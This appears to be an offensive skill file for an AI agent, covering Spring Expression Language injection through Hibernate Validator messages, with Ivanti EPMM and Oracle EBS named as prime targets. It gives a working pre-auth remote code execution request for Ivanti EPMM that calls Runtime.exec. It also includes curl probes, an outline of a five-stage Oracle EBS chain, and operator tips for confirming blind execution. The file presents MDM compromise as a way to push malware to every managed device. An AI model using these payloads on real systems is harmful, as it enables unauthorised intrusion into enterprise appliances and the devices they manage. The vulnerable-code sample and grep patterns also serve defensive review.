---
name: spring-el-injection
description: "Exploit Spring Expression Language injection through Hibernate Validator constraint messages and custom validators that interpolate user input, reaching pre-auth RCE on products such as Ivanti EPMM. Use when a Spring/Java target reflects input into validation error messages, or when testing appliances built on Spring Boot."
---

# Spring Validation Expression Language Injection

## Crown Jewel Targets

- Ivanti Endpoint Manager Mobile (EPMM) — MDM managing thousands of devices
- Spring Boot apps with custom Hibernate Validators accepting user input in messages
- Oracle E-Business Suite (XSLT variant via Host header chain)
- Any Java enterprise app using `buildConstraintViolationWithTemplate()` with user data
- MDM/UEM platforms (compromise = push malware to all managed devices)
- Spring REST APIs with bean validation on request parameters

## Attack Surface Signals

- URL patterns: `/api/v2/`, `/mifs/rs/api/`, `/rest/`, Spring Boot actuator paths
- Headers: `X-Application-Context`, `X-Powered-By: Spring`
- Error messages: `ConstraintViolationException`, `javax.validation`, `Hibernate Validator`
- EL test: parameter `${7*7}` returning `49` in error response
- Tech indicators: JSESSIONID cookie, Spring Boot error JSON format

**Sources:** WatchTowr Labs (Ivanti EPMM CVE-2025-4427/4428, 2025), Oracle EBS CVE-2025-61882
**Key CVEs:** CVE-2025-4427, CVE-2025-4428, CVE-2025-61882

## Overview

Spring's bean validation (Hibernate Validator) evaluates Expression Language in constraint violation messages. When user input is interpolated into violation messages, EL expressions execute — critically, BEFORE `@PreAuthorize` or Spring Security authentication checks.

## Core Vulnerability

```java
// Vulnerable validator
public class MyValidator implements ConstraintValidator<MyConstraint, String> {
    public boolean isValid(String value, ConstraintValidatorContext ctx) {
        ctx.disableDefaultConstraintViolation();
        ctx.buildConstraintViolationWithTemplate(
            "Invalid format: " + value  // USER INPUT in template!
        ).addConstraintViolation();
        return false;
    }
}
```

The `value` string is processed by `AbstractMessageSource.getMessage()` which evaluates `${...}` EL expressions.

## Exploitation (Ivanti EPMM)

```
GET /mifs/rs/api/v2/featureusage?format=${"".getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}
```

- Route `/rs/api/v2/**` had no `<intercept-url>` rules
- Validation fires BEFORE controller's `@PreAuthorize`
- Blind RCE: `Process[pid=X]` in error response confirms execution

## Oracle EBS XSLT Variant

Five-stage chain: SSRF → CRLF injection → HTTP keep-alive smuggling → auth whitelist bypass (`/help/../target`) → Host header XSLT injection for RCE.

## Detection

```bash
# Test Spring EL injection
curl "https://target/api/endpoint?param=\${7*7}"
# If response contains "49" → EL injection confirmed

# Ivanti EPMM specific
curl "https://target/mifs/rs/api/v2/featureusage?format=\${7*7}"

# General Spring validation endpoints
curl "https://target/api/v1/users" -d '{"email":"${7*7}@test.com"}'
```

## Code Review Patterns

```
buildConstraintViolationWithTemplate  // Direct template injection
HibernateConstraintValidatorContext   // Custom violation messages
AbstractMessageSource.getMessage      // EL evaluation sink
javax.validation.ConstraintValidator  // All custom validators
```

## Bug Bounty Relevance

- Affects ANY Spring Boot application using custom Hibernate Validators with user input in messages
- Pre-auth: validation occurs before Spring Security filter chain
- Extremely common pattern in enterprise Java applications
- MDM compromise (Ivanti) = push malware to all managed devices

## Operator Notes (Battle-Tested)

- **Pre-auth by design**: Validation fires BEFORE Spring Security filter chain. The Ivanti EPMM route had NO `<intercept-url>` rules — validation ran on unauthenticated requests.
- **`${7*7}` is the canary**: Inject in every parameter on Spring endpoints. If `49` appears in any error response, EL injection is confirmed.
- **Check ALL custom validators**: Grep for `buildConstraintViolationWithTemplate` — any instance concatenating user input is vulnerable.
- **Blind RCE detection**: `Process[pid=X]` in error response confirms `Runtime.exec()` ran. Use interactsh for OOB confirmation.
- **Not just Spring**: Any Java framework using Hibernate Validator with custom messages is affected. Check Quarkus, Micronaut, Jakarta EE.
- **Oracle EBS variant is a 5-stage chain**: SSRF + CRLF + keep-alive smuggling + auth bypass + XSLT injection. Complex but devastating.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `ssti-testing` | General SSTI methodology |
| `java-matrix-param-bypass` | Bypass auth to reach validation endpoints |
| `server-confusion-attacks` → `references/tomcat-path-normalization-bypass.md` | Path confusion to access internal APIs |
| `bash-rewritemap-injection` | Another Ivanti attack vector |
| `appliance-management-attacks` | MDM/UEM management interface patterns |
